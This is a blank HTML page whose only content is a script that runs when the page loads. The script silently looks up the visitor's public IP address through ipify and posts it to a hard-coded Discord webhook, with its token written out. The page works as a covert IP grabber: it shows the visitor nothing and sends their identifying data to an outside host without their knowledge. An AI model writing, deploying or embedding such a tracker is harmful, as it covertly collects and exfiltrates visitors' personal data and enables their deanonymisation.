<!DOCTYPE html>
<html>
<body>

<script>
window.onload = function() {
  fetch('https://api.ipify.org/?format=json')
    .then(response => response.json())
    .then(data => {
      var ip = data.ip;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://discord.com/api/webhooks/1274389071652716687/v_H39wrA5VxiwqhTnNFE6df4rq4JbLkh5KM9Pr5gEbjEqkc4Xc2EdboKPR1Me5RVRCO1", true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify({ content: ip }));
    })
    .catch(error => console.error(error));
};
</script>

</body>
</html>
